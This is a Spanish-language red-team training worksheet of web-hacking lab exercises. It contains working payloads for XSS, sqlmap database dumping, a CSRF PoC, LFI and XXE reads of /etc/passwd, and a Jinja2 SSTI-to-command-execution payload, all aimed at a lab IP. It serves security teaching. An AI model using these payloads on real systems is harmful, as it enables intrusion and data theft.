# Red Team - Fase 2: Web Hacking Ejercicios

## Ejercicio 1: Burp Suite Setup

### Objetivo
Configurar Burp Suite como proxy.

### Pasos
1. Descargar Burp Suite Community
2. Configurar proxy en navegador: 127.0.0.1:8080
3. Instalar certificado CA (para HTTPS)
4. Interceptar primera petición
5. Analizar структура request/response

### Entregable
Captura con tráfico interceptado.

---

## Ejercicio 2: XSS

### Objetivo
Detectar y explotar XSS.

### Pasos
1. Instalar DVWA o usar laboratorio
2. Probar payloads básicos:
   ```html
   <script>alert(1)</script>
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>
   ```
3. Probar bypasses si hay WAF
4. Documentar hallazgos

### ⚠️ ADVERTENCIA
Solo en laboratorios controlados.

### Entregable
XSS payload que funciona y screenshot.

---

## Ejercicio 3: SQL Injection

### Objetivo
Explotar SQLi con SQLmap.

### Pasos
```bash
# Detectar SQLi
sqlmap -u "http://192.168.1.77/vulnerable.php?id=1"

#Enumerar bases de datos
sqlmap -u "http://192.168.1.77/vulnerable.php?id=1" --dbs

# Enumerar tablas
sqlmap -u "http://192.168.1.77/vulnerable.php?id=1" -D webapp --tables

# Dump datos
sqlmap -u "http://192.168.1.77/vulnerable.php?id=1" -D webapp -T users --dump
```

### Entregable
Captura de enumera-ción de datos.

---

## Ejercicio 4: CSRF

### Objetivo
Crear PoC de CSRF.

### Pasos
1. Identificar acción vulnerable (cambio de email, password, etc.)
2. Crear HTML PoC:
   ```html
   <form action="http://192.168.1.77/settings" method="POST">
     <input type="hidden" name="email" value="hacker@evil.com">
   </form>
   <script>document.forms[0].submit()</script>
   ```
3. Probar que funciona

### Entregable
HTML PoC funcional.

---

## Ejercicio 5: LFI

### Objetivo
Explotar LFI.

### Pasos
```bash
# Payloads básicos
http://192.168.1.77/page=../../../../etc/passwd
http://192.168.1.77/page=../../etc/passwd
http://192.168.1.77/page....//....//....//etc/passwd

# PHP wrappers
http://192.168.1.77/page=php://filter/convert.base64-encode/resource=index.php
```

### Entregable
Contenido de /etc/passwd obtenido.

---

## Ejercicio 6: XXE

### Objetivo
Explotar XXE.

### Pasos
1. Enviar XML:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <data>&xxe;</data>
   ```
2. Probar diferentes entity types
3. Si hayblind XXE, usar external DTD

### Entregable
Contenido de archivo leído.

---

## Ejercicio 7: SSTI

### Objetivo
Detectar y explotar SSTI.

### Pasos
1. Detectar:
   ```jinja2
   {{7*7}}
   ```
2. Si retorna 49, es vulnerable
3. Escalar a RCE:
   ```jinja2
   {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
   ```

### Entregable
Output de comando ejecutado.

---

## Ejercicio 8: API REST

### Objetivo
Enumerar y explotar API REST.

### Pasos
```bash
# Ver métodos
curl -X OPTIONS http://192.168.1.77/api/users

# GET
curl http://192.168.1.77/api/users

# POST con JSON
curl -X POST -H "Content-Type: application/json" \
  -d '{"username":"test"}' http://192.168.1.77/api/users
```

### Entregable
Enumeración de endpoints.

---

## Ejercicio 9: GraphQL

### Objetivo
Explotar GraphQL.

### Pasos
1. Introspection query:
   ```graphql
   {
     __schema {
       types {
         name
         fields {
           name
         }
       }
     }
   }
   ```
2. Mutation de prueba
3. Buscar campos sensibles

### Entregable
Schema obtenido y datos sensibles.

---

## Ejercicio 10: Full Writeup

### Objetivo
Crear writeup completo de aplicación vulnerable.

### Pasos
1. Escaneo con nikto/nmap
2.Enumerar con Burp
3. Documentar vulnerabilidades
4. Crear writeup profesional

### Entregable
Writeup PDF/Markdown completo.